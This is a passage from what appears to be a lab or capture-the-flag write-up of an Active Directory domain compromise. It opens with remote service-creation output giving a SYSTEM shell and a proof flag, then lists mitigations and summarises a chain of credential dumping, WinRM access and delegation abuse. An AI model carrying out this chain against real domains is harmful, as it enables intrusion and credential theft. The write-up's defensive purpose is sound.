[*] Opening SVCManager on resourcedc.resourced.local.....
[*] Creating service EgVy on resourcedc.resourced.local.....
[*] Starting service EgVy.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.17763.2145]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32> whoami
nt authority\system

C:\Windows\system32> type \Users\Administrator\Desktop\proof.txt
d6c6383c84141a767ba9340d5b871124
```

## Mitigation

- Restrict anonymous and unauthenticated RPC enumeration to prevent domain user disclosure.
- Remove sensitive credentials from Active Directory object descriptions and enforce credential handling policies.
- Audit SMB share permissions and remove read access to sensitive shares containing domain backup material.
- Prohibit storage of `NTDS.dit`, `SYSTEM`, and registry hives on network-accessible shares.
- Enforce least-privilege access on SMB shares and restrict access to domain controller backups to authorized administrators only.
- Monitor and alert on access to sensitive AD database files and registry hives.
- Implement credential hygiene by disabling NTLM where possible and enforcing strong authentication controls.
- Restrict WinRM access to administrative users and monitor authentication attempts.
- Regularly audit Active Directory ACLs to detect and remove excessive permissions such as `GenericAll` on domain controllers.
- Limit the ability for non-administrative users to create machine accounts in the domain.
- Monitor changes to `msDS-AllowedToActOnBehalfOfOtherIdentity` attributes to detect RBCD abuse.
- Implement logging and alerting for Kerberos delegation changes and suspicious service ticket requests.

## Conclusion

The compromise began with unauthenticated enumeration of Active Directory users, followed by credential disclosure via a plaintext password stored in a user description. Valid credentials allowed authenticated SMB access to an improperly secured share containing domain controller backup files.

Extraction of the `NTDS.dit` and `SYSTEM` hives enabled offline credential dumping, resulting in recovery of domain user password hashes. These hashes were leveraged to authenticate via WinRM and obtain an initial domain foothold.

Further analysis using BloodHound revealed excessive Active Directory permissions, specifically `GenericAll` rights over the domain controller computer object. This misconfiguration enabled abuse of Resource-Based Constrained Delegation to impersonate the domain administrator account.

The attack demonstrates how multiple low-to-medium severity misconfigurations—credential exposure, insecure backup storage, excessive ACL permissions, and unrestricted delegation—can be chained to achieve full domain compromise. Proper hardening, access control enforcement, and monitoring would have prevented escalation to Domain Administrator.